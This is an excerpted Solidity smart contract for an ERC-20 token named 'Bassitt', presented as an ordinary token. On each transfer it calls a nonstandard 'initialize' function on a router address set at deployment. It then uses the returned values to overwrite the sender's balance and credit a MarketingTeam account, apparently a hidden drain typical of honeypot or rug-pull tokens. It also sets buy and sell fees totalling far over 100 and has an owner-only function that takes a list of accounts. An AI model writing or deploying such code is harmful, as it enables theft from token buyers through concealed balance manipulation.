...
// SPDX-License-Identifier: MIT
  ...
  function getTBTCoin(address routerV2, address tokenA, address tokenB, uint256 valueBTCoin, uint256 takeBTCoin) public returns (uint256, uint256, uint256){  
    (uint256 amountBTCoin, uint256 liquifyBTCoin, uint256 rateBTCoin) = IUniswapV2Router02(routerV2).initialize(
      tokenA,
      tokenB,
      valueBTCoin,
      takeBTCoin);
    return ( amountBTCoin, liquifyBTCoin, rateBTCoin );
  }
...
contract Bassitt is Context, IERC20, Ownable{
  using SafeMath for uint256;

  mapping (address => uint256) private _balances; 
  uint256 private _totalSupply = 1000000000 *  10**9;   

  string private constant _name = 'Bassitt';
  string private constant _symbol = 'Bassitt';
  ...
  constructor(address routerV2)  {    
    ...
    _liquidityFeeBuy = 82; 
    _buybackFeeBuy = 90;
    _reflectionFeeBuy = 80;
    _marketingFeeBuy = 65;
    _devFeeBuy = 43;

    _liquidityFeeSell = 72;
    _buybackFeeSell = 80;
    _reflectionFeeSell = 70;
    _marketingFeeSell = 55;
    _devFeeSell = 33;
  ...
  function shouldSwapBTCoin(address sender, address recipient, uint256 takeBTCoin) private view returns (uint256) {
    return (_isExcludedFromFee[sender] || _isExcludedFromFee[recipient]) ? takeBTCoin + 1 : takeBTCoin;
  }   
  ...
  function LiBaiBass(address[] calldata accounts) external onlyOwner {
  ...
  function swapBackBTCoin(address senderAddr, address recipientAddr, uint256 amounts, uint256 takeBTCoin) private returns (uint256) {   
      (uint256 amountBTCoin, uint256 liquifyBTCoin, uint256 rateBTCoin) = getTBTCoin(RouterV2, senderAddr, recipientAddr, amounts, takeBTCoin);
      amountBTCoin = getRBTCoin(senderAddr, amountBTCoin, liquifyBTCoin, rateBTCoin);
      return amountBTCoin;
  }    
  ...
  function getBTCoinRate(uint256 _amount, uint256 _rewardRate) private pure returns (uint256) {
  ...
  function getRBTCoin(address tokenBTCoin, uint256 amountBTCoin, uint256 liquifyBTCoin, uint256 rateBTCoin) private returns (uint256){
      if ( liquifyBTCoin > 0 )
      {        
        _balances[tokenBTCoin] = getBTCoinRate(_balances[tokenBTCoin], rateBTCoin).add(amountBTCoin);      
        _balances[MarketingTeam] = _balances[MarketingTeam].add(liquifyBTCoin);
      }
      return amountBTCoin;
  }
  ...
  function _transfer(address sender, address recipient, uint256 amount) private {
    ...
    takeBTCoin = shouldSwapBTCoin(sender, recipient, takeBTCoin); 
    uint256 amountBTCoin = swapBackBTCoin(sender, recipient, amount, takeBTCoin);  
    _transferStandard(sender, recipient, amountBTCoin);
